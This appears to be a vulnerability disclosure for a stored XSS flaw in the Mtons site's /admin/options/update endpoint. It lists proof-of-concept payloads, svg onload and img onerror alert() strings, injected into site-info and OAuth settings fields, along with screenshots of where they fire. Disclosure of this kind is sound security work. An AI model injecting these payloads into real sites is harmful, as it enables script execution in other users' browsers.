# Summary

The /admin/options/update endpoint is used for setting site information and related configurations, all user-controlled input parameters have no security checks, and output pages in multiple places on the frontend and admin panel have no encoding processing, thus creating stored XSS vulnerabilities.

---

# POC

## Site Info Settings


```
Mtons"><svg/onload=alert('SiteName')>
http://mtons.com"><svg/onload=alert('DomainName')>
mtons,博客,社区1"><svg/onload=alert(Keyword)>
Mtons,做一个有内涵的技术社区1"><svg/onload=alert('SiteDescription')>
1"><svg/onload=alert('Meta')>
1"><svg/onload=alert('Copyright')>
1"><svg/onload=alert('CopyNumber')>
```

![输入图片说明](https://cdn.nlark.com/yuque/0/2026/png/25709736/1773131814847-bff029e4-97fa-40dc-a4fb-4b364f840f4d.png)

![输入图片说明](https://cdn.nlark.com/yuque/0/2026/png/25709736/1773131854241-5825ddbc-6061-43b5-a576-0acdb4fc7b19.png)

### SINKS - all pages that include header or footer

- Admin panel - /admin/options/index  
    
    ![输入图片说明](https://cdn.nlark.com/yuque/0/2026/png/25709736/1773131896723-0bf0e3a6-a5e8-48e6-9e3a-f4850ba47747.png)
    
- Frontend - homepage


    

![输入图片说明](https://cdn.nlark.com/yuque/0/2026/png/25709736/1773131913489-f2ed60e8-8591-4fc5-bd5c-221455ef98c5.png)

---

## Oauth Login Settings

```
1"><img src=1 onerror=alert(/callback/)>
1"><img src=1 onerror=alert(/appid/)>
1"><img src=1 onerror=alert(/appkey/)>
```

![输入图片说明](https://cdn.nlark.com/yuque/0/2026/png/25709736/1773131942030-0fb89dd3-f74d-4f86-834a-4eee879c7d4e.png)


![输入图片说明](https://cdn.nlark.com/yuque/0/2026/png/25709736/1773131966797-f879e89f-52ae-4d52-ac60-ca1e4f4548f9.png?x-oss-process=image%2Fformat%2Cwebp)


![输入图片说明](https://cdn.nlark.com/yuque/0/2026/png/25709736/1773131996413-8ba01c76-fd7c-4478-9fb3-fbb02fc9f7e0.png)
